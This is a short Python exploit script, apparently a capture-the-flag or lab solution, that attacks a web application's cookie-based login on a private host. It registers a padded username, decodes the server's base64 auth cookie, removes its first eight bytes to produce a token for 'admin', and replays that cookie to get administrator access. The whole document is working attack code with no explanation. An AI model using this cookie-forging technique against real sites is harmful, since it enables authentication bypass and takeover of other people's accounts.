import requests
import urllib
import base64
host = "http://192.168.73.140"
r = requests.post(host+"/register.php",data = {"name" : "aaaaaaaaadmin"},allow_redirects=False)

cookie = r.headers["Set-Cookie"]
print("All cookie : ", cookie)
#get auth value
auth = cookie.split(";")
auth = auth[0].split("=")
auth = urllib.parse.unquote(auth[1])
print("Cookie authentication is : ",auth)
# Decode auth
auth = base64.b64decode(auth)
auth = auth[8:]
auth = base64.b64encode(auth)
print("Cookie for admin is : ",auth)
r= requests.post(host,cookies={'auth':auth.decode()})
print(r.text)